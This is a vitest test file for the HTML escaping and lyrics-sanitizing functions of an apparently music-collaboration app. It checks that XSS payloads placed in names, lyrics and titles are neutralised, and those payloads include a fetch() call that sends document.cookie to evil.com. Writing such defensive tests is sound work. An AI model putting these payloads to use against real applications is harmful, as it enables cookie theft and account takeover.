import { describe, it, expect } from 'vitest';
import { escapeHtml, sanitizeLyricsHtml } from './htmlSecurity';

describe('Desktop HTML Security & Safe Rendering', () => {
  describe('escapeHtml utility', () => {
    it('handles null, undefined, and non-string types safely', () => {
      expect(escapeHtml(null)).toBe('');
      expect(escapeHtml(undefined)).toBe('');
      expect(escapeHtml('')).toBe('');
      expect(escapeHtml(12345)).toBe('12345');
      expect(escapeHtml(0)).toBe('0');
      expect(escapeHtml(false)).toBe('false');
    });

    it('escapes special HTML characters: &, <, >, ", \'', () => {
      expect(escapeHtml('Rock & Roll')).toBe('Rock &amp; Roll');
      expect(escapeHtml('<script>alert("XSS")</script>')).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(escapeHtml("John's Band")).toBe('John&#039;s Band');
      expect(escapeHtml('"><img src=x onerror=alert(1)>')).toBe('&quot;&gt;&lt;img src=x onerror=alert(1)&gt;');
    });

    it('neutralizes malicious payload injection attempts in project and participant names', () => {
      const maliciousName = '<img src=x onerror="fetch(\'http://evil.com/steal?cookie=\'+document.cookie)">';
      const escaped = escapeHtml(maliciousName);
      expect(escaped).not.toContain('<img');
      expect(escaped).not.toContain('<');
      expect(escaped).not.toContain('>');
      expect(escaped).toContain('&lt;img src=x onerror=&quot;');
    });
  });

  describe('sanitizeLyricsHtml utility', () => {
    it('removes executable <script> tags completely', () => {
      const dirty = 'Verse 1<script>alert("hacked")</script> Line 2';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('alert');
      expect(clean).toContain('Verse 1 Line 2');
    });

    it('strips dangerous elements like iframe, object, embed, svg, and form', () => {
      const dirty = '<iframe src="javascript:alert(1)"></iframe><object data="bad.swf"></object><svg onload="alert(2)"></svg>Chorus';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('<object');
      expect(clean).not.toContain('<svg');
      expect(clean).toContain('Chorus');
    });

    it('strips all inline event handlers (onerror, onload, onclick, onmouseover, etc.)', () => {
      const dirty = '<p onclick="stealData()" onmouseover="boom()" onerror="bad()">My lyrics line</p>';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).not.toContain('onclick');
      expect(clean).not.toContain('onmouseover');
      expect(clean).not.toContain('onerror');
      expect(clean).toContain('<p>My lyrics line</p>');
    });

    it('preserves rich songwriting formatting tags (b, i, u, strike, strong, em, p, div, br)', () => {
      const songwritingHtml = '<b>[Verse 1]</b><br><i>Soft whisper</i> in the <u>night</u><br><s>Old line</s><br><div>Second block</div>';
      const clean = sanitizeLyricsHtml(songwritingHtml);
      expect(clean).toContain('<b>[Verse 1]</b>');
      expect(clean).toContain('<i>Soft whisper</i>');
      expect(clean).toContain('<u>night</u>');
      expect(clean).toContain('<s>Old line</s>');
      expect(clean).toContain('<div>Second block</div>');
    });

    it('preserves song section tags and doc page break gaps while filtering unknown classes', () => {
      const dirty = '<div class="song-section-tag evil-class">[Chorus 1]</div><div class="doc-page-break-gap malicious">[Bridge]</div><span class="untrusted">vocal</span>';
      const clean = sanitizeLyricsHtml(dirty);
      expect(clean).toContain('class="song-section-tag"');
      expect(clean).toContain('class="doc-page-break-gap"');
      expect(clean).not.toContain('evil-class');
      expect(clean).not.toContain('malicious');
      expect(clean).not.toContain('untrusted');
    });

    it('preserves safe styling (color, background-color, font-size, line-height, text-align) while stripping expressions and javascript URLs', () => {
      const styled = '<span style="color: #38bdf8; font-size: 16px; text-align: center;">Vocal Hook</span>';
      const clean = sanitizeLyricsHtml(styled);
      expect(clean).toContain('color: #38bdf8');
      expect(clean).toContain('font-size: 16px');
      expect(clean).toContain('text-align: center');

      const maliciousStyle = '<span style="background-image: url(\'javascript:alert(1)\'); color: red;">Injected</span>';
      const cleanMalicious = sanitizeLyricsHtml(maliciousStyle);
      expect(cleanMalicious).not.toContain('javascript');
      expect(cleanMalicious).toContain('color: red');
    });

    it('preserves multi-line formatting and intentional line breaks', () => {
      const lyricsWithBreaks = 'Line 1<br>Line 2<br><br><div>Line 3</div><div>Line 4</div>';
      const clean = sanitizeLyricsHtml(lyricsWithBreaks);
      expect(clean).toContain('Line 1<br>Line 2<br><br><div>Line 3</div><div>Line 4</div>');
    });
  });

  describe('User-controlled field rendering protection', () => {
    it('ensures project titles and descriptions are sanitized when interpolated', () => {
      const project = {
        name: '<script>alert("project")</script>Album Master',
        description: 'Recorded by <img src=x onerror=alert(1)>'
      };

      const safeTitle = escapeHtml(project.name);
      const safeDesc = escapeHtml(project.description);

      expect(safeTitle).toBe('&lt;script&gt;alert(&quot;project&quot;)&lt;/script&gt;Album Master');
      expect(safeDesc).toBe('Recorded by &lt;img src=x onerror=alert(1)&gt;');
    });

    it('ensures collaborator names, handles, and avatars are safely formatted', () => {
      const collaborator = {
        displayName: '<b onmouseover=alert(1)>Producer Bob</b>',
        username: 'bob"><script>',
        avatarColor: '#38bdf8'
      };

      const initials = escapeHtml(collaborator.displayName.split(' ').map(n => n[0]).join('').toUpperCase().slice(0, 2));
      const safeName = escapeHtml(collaborator.displayName);
      const safeHandle = escapeHtml(collaborator.username);

      expect(safeName).toContain('&lt;b onmouseover=alert(1)&gt;Producer Bob&lt;/b&gt;');
      expect(safeHandle).toContain('bob&quot;&gt;&lt;script&gt;');
      expect(initials).not.toContain('<');
    });

    it('ensures session summary event descriptions are safely formatted', () => {
      const eventDesc = 'Created task "<script>stealData()</script>" in workspace';
      const safeDesc = escapeHtml(eventDesc);
      expect(safeDesc).toBe('Created task &quot;&lt;script&gt;stealData()&lt;/script&gt;&quot; in workspace');
    });

    it('ensures window and DAW titles are safely formatted', () => {
      const windowSource = {
        name: 'Browser Window - <img src=x onerror=alert("hacked")>'
      };
      const safeName = escapeHtml(windowSource.name);
      expect(safeName).toContain('&lt;img src=x onerror=alert(&quot;hacked&quot;)&gt;');
      expect(safeName).not.toContain('<img');
    });
  });
});
